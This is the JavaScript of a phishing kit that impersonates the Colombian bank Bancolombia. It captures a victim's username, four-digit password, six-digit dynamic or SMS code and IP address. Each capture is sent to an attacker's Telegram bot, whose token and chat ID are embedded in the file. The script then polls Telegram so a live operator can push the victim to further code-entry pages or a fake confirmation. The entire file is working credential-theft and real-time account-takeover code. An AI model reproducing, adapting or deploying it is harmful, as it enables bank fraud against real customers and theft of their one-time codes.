
'use strict';

const CONFIG = {
  telegramToken: '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw',
  telegramChatId: '-1004245962123',
  apiBase: 'https://api.telegram.org',
  ipUrl: 'https://api.ipify.org?format=json',
  pollIntervalMs: 2000,
  maxPollMs: 10 * 60 * 1000,
  ipTimeoutMs: 5000,
  pages: {
    index: 'index.html',
    login: 'usuariobancoco.html',
    otp: 'pinword.html',
    sms: 'pinwordsms.html',
    confirm: '../../confirmacion.html',
    exit: 'https://www.bancolombia.com/personas'
  }
};

const state = { page: 'index', decisionToken: 0 };

/* ------------------------------- utilidades ------------------------------ */
const $ = (id) => document.getElementById(id);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const esc = (s) => String(s).replace(/[&<>"']/g, (c) =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

function store(key, value) {
  try { sessionStorage.setItem(key, String(value)); } catch (_) {}
}
function read(key) {
  try { return sessionStorage.getItem(key); } catch (_) { return null; }
}

function showLoading() { const o = $('loading-overlay'); if (o) o.style.display = 'flex'; }
function hideLoading() { const o = $('loading-overlay'); if (o) o.style.display = 'none'; }

function showBanner(text) {
  let b = $('flow-banner');
  if (!b) {
    b = document.createElement('div');
    b.id = 'flow-banner';
    b.style.cssText = 'position:fixed;bottom:16px;left:50%;transform:translateX(-50%);' +
      'background:#c62828;color:#fff;padding:10px 16px;border-radius:8px;z-index:10001;' +
      'font:14px sans-serif;max-width:90vw;text-align:center';
    document.body.appendChild(b);
  }
  b.textContent = text;
  b.style.display = 'block';
}
function hideBanner() { const b = $('flow-banner'); if (b) b.style.display = 'none'; }

function detectPage() {
  const forced = document.body && document.body.dataset ? document.body.dataset.page : '';
  if (forced) return forced;

  const file = location.pathname.split('/').pop().toLowerCase();
  if (file.includes('confirmacion')) return 'confirm';
  if (file.includes('pinwordsms')) return 'sms';
  if (file.includes('pinword')) return 'otp';
  if (file.includes('usuariobancoco')) return 'login';
  if ($('username')) return 'login';
  if ($('pin-entry')) return document.title.toLowerCase().includes('sms') ? 'sms' : 'otp';
  return 'index';
}

/* -------------------------------- Telegram ------------------------------- */
async function tg(method, payload) {
  const res = await fetch(`${CONFIG.apiBase}/bot${CONFIG.telegramToken}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || data.ok === false) {
    throw new Error(data.description || `Telegram ${method} (${res.status})`);
  }
  return data.result;
}

async function sendTelegramMessage(text, buttons) {
  const payload = {
    chat_id: CONFIG.telegramChatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (buttons) payload.reply_markup = { inline_keyboard: buttons };
  const result = await tg('sendMessage', payload);
  return result && result.message_id;
}

async function answerCallback(callbackId) {
  try { await tg('answerCallbackQuery', { callback_query_id: callbackId }); } catch (_) {}
}

async function removeKeyboard(messageId) {
  try {
    await tg('editMessageReplyMarkup', {
      chat_id: CONFIG.telegramChatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    });
  } catch (_) {}
}

async function getIP() {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), CONFIG.ipTimeoutMs);
    const res = await fetch(CONFIG.ipUrl, { signal: ctrl.signal });
    clearTimeout(timer);
    const data = await res.json();
    return data.ip || 'No se pudo obtener';
  } catch (_) {
    return 'No se pudo obtener';
  }
}

/* ------------------------------- decisiones ------------------------------ */
function decisionButtons(page) {
  if (page === 'login') {
    return [
      [{ text: '## ASK OTP ##', callback_data: 'ask_otp' }],
      [{ text: '## ASK SMS ##', callback_data: 'ask_sms' }],
      [{ text: '## FINALIZAR ##', callback_data: 'finalizar' }],
      [{ text: '## ERROR LOGIN ##', callback_data: 'error_login' }]
    ];
  }
  const alt = page === 'sms'
    ? [{ text: '## ASK OTP ##', callback_data: 'ask_otp' }]
    : [{ text: '## ASK SMS ##', callback_data: 'ask_sms' }];
  return [
    [{ text: '## FINALIZAR ##', callback_data: 'finalizar' }],
    [{ text: '## ERROR OTP ##', callback_data: 'error_otp' }],
    [{ text: '## ERROR LOGIN ##', callback_data: 'error_login' }],
    alt
  ];
}

function go(targetKey) {
  const url = CONFIG.pages[targetKey];
  if (url) window.location.href = url;
}

async function handleAction(action) {
  hideLoading();
  hideBanner();
  const here = state.page;

  switch (action) {
    case 'finalizar':
      showLoading();
      await sendTelegramMessage('✅ <b>Proceso finalizado</b>').catch(() => {});
      go('confirm');
      break;

    case 'error_otp':
      if (here === 'otp' || here === 'sms') showPinError();
      else go('otp');
      break;

    case 'error_login':
      if (here === 'login') {
        showUserError();
        setTimeout(() => go('login'), 2000);
      } else {
        showUserError();
        setTimeout(() => go('login'), 2000);
      }
      break;

    case 'ask_sms':
      go('sms');
      break;

    case 'ask_otp':
      go('otp');
      break;
  }
}

/* --------------------------------- polling ------------------------------- */
async function pollDecision(messageId, token) {
  const started = Date.now();
  let backoff = 0;

  while (token === state.decisionToken && Date.now() - started < CONFIG.maxPollMs) {
    try {
      const last = Number(read('bb:lastUpdateId') || 0);
      const qs = new URLSearchParams({
        allowed_updates: JSON.stringify(['callback_query']),
        timeout: '0'
      });
      qs.set('offset', last ? String(last + 1) : '-1');

      const res = await fetch(
        `${CONFIG.apiBase}/bot${CONFIG.telegramToken}/getUpdates?${qs.toString()}`
      );
      const data = await res.json().catch(() => ({}));

      if (data.ok) {
        backoff = 0;
        for (const upd of data.result || []) {
          store('bb:lastUpdateId', upd.update_id);
          const cq = upd.callback_query;
          if (!cq) continue;
          if (!cq.message || cq.message.message_id !== messageId) continue;

          state.decisionToken++;            // corta el loop
          await answerCallback(cq.id);
          await removeKeyboard(messageId);
          await handleAction(cq.data);
          return;
        }
      }
    } catch (err) {
      backoff = Math.min(backoff + 1000, 8000);
      console.warn('Polling Telegram:', err.message);
    }
    await sleep(CONFIG.pollIntervalMs + backoff);
  }

  if (token === state.decisionToken) {
    hideLoading();
    showBanner('Sin respuesta de Telegram. Vuelve a intentar el paso.');
  }
}

/** Envía el mensaje de decisión y espera el callback. */
async function askDecision(contextText, page) {
  const token = ++state.decisionToken;
  showLoading();
  hideBanner();

  let messageId;
  try {
    messageId = await sendTelegramMessage(contextText, decisionButtons(page));
  } catch (err) {
    console.error('No se pudo enviar la decisión:', err);
  }

  if (!messageId) {
    hideLoading();
    showBanner('No se pudo contactar a Telegram. Revisa la conexión e intenta de nuevo.');
    return;
  }
  await pollDecision(messageId, token);
}

/* ---------------------------------- PIN ---------------------------------- */
function pinDots() {
  return Array.prototype.slice.call(document.querySelectorAll('.pin-dot'));
}

function paintDots(length) {
  pinDots().forEach((dot, i) => { dot.style.opacity = i < length ? '1' : '0'; });
}

function showPinError() {
  const pinError = $('pin-error');
  if (pinError) pinError.style.display = 'block';
  const entry = $('pin-entry');
  if (entry) { entry.value = ''; entry.focus(); }
  paintDots(0);
  const btn = $('continueBtn');
  if (btn) btn.disabled = true;
}

function showUserError() {
  const userError = $('user-error');
  if (userError) userError.style.display = 'block';
  const errMsg = $('error-message');
  if (errMsg) {
    errMsg.style.display = 'block';
    errMsg.textContent = 'Usuario invalido o incorrecto';
  }
}

function hideErrors() {
  ['pin-error', 'user-error', 'error-message'].forEach((id) => {
    const el = $(id);
    if (el) el.style.display = 'none';
  });
}

function bindPinPage(page) {
  const entry = $('pin-entry');
  const btn = $('continueBtn');
  if (!entry || !btn) return;

  entry.addEventListener('input', () => {
    entry.value = entry.value.replace(/[^0-9]/g, '').slice(0, 6);
    paintDots(entry.value.length);
    btn.disabled = entry.value.length !== 6;
    hideErrors();
  });

  entry.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && entry.value.length === 6) btn.click();
  });

  btn.addEventListener('click', async () => {
    const pin = entry.value;
    if (pin.length !== 6) return;

    btn.disabled = true;
    const ip = await getIP();
    const tipo = page === 'sms' ? 'SMS' : 'Dinámica';

    try {
      await sendTelegramMessage(
        `🏦 <b>Nuevo Hit Bancolombia</b>\n\n🌐 IP: ${esc(ip)}\n🔢 Clave ${tipo}: <b>${esc(pin)}</b>`
      );
    } catch (err) {
      console.error('Hit no enviado:', err);
    }

    await askDecision(`🤔 <b>Toma una decisión</b>\n\n🌐 IP: ${esc(ip)}`, page);
    btn.disabled = false;
  });
}

/* --------------------------------- LOGIN --------------------------------- */
function usernameOk(value) {
  return /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]+$/.test(value);
}

function bindLoginPage() {
  const username = $('username');
  const password = $('password');
  const btn = $('continueButton');
  if (!username || !password || !btn) return;

  const refresh = () => {
    btn.disabled = !(usernameOk(username.value.trim()) && password.value.length === 4);
  };

  username.addEventListener('input', () => { hideErrors(); refresh(); });
  username.addEventListener('blur', () => {
    const v = username.value.trim();
    if (v && !usernameOk(v)) showUserError();
    else if (v) hideErrors();
    refresh();
  });

  password.addEventListener('input', () => {
    password.value = password.value.replace(/[^0-9]/g, '').slice(0, 4);
    hideErrors();
    refresh();
  });

  [username, password].forEach((field) => field.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !btn.disabled) btn.click();
  }));

  btn.addEventListener('click', async (e) => {
    e.preventDefault();
    const user = username.value.trim();
    const pass = password.value.trim();
    if (!usernameOk(user) || pass.length !== 4) { showUserError(); return; }

    btn.disabled = true;
    const ip = await getIP();

    try {
      await sendTelegramMessage(
        `🏦 <b>Nuevo Log Bancolombia</b>\n\n🌐 IP: ${esc(ip)}\n👤 Usuario: <b>${esc(user)}</b>\n🔑 Contraseña: <b>${esc(pass)}</b>`
      );
    } catch (err) {
      console.error('Log no enviado:', err);
    }

    await askDecision(`🤔 <b>Toma una decisión</b>\n\n🌐 IP: ${esc(ip)}`, 'login');
    btn.disabled = false;
  });

  refresh();
}

/* --------------------------------- INDEX --------------------------------- */
function bindIndexPage() {
  document.querySelectorAll('.button[data-type]').forEach((button) => {
    button.addEventListener('click', (e) => {
      e.preventDefault();
      showLoading();
      setTimeout(() => go('login'), 1200);
    });
  });
}

async function announceStart() {
  const ip = await getIP();
  const hora = new Date().toLocaleString('es-CO');
  try {
    await sendTelegramMessage(
      `🏦 <b>Preparando Log Bancolombia</b>\n\n🌐 IP: ${esc(ip)}\n⏰ Hora: ${esc(hora)}\n\n🍀 Buena suerte aventurero`
    );
  } catch (err) {
    console.error('Aviso inicial no enviado:', err);
  }
}

/* --------------------------------- COMÚN --------------------------------- */
function bindCommon() {
  document.querySelectorAll('.exit-button').forEach((b) =>
    b.addEventListener('click', () => go('exit')));

  document.querySelectorAll('.btn-back, .button-outline').forEach((b) =>
    b.addEventListener('click', () => {
      if (history.length > 1) history.back();
      else go('index');
    }));

  // Al volver con el botón del navegador: cortar polling y limpiar overlay.
  window.addEventListener('pageshow', (event) => {
    if (event.persisted) {
      state.decisionToken++;
      hideLoading();
      hideBanner();
    }
  });
}

/* --------------------------------- ARRANQUE ------------------------------ */
function boot() {
  state.page = detectPage();

  if (state.page === 'confirm') return;

  bindCommon();

  if (state.page === 'index') {
    bindIndexPage();
    announceStart();
  } else if (state.page === 'login') {
    bindLoginPage();
  } else {
    bindPinPage(state.page);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', boot);
} else {
  boot();
}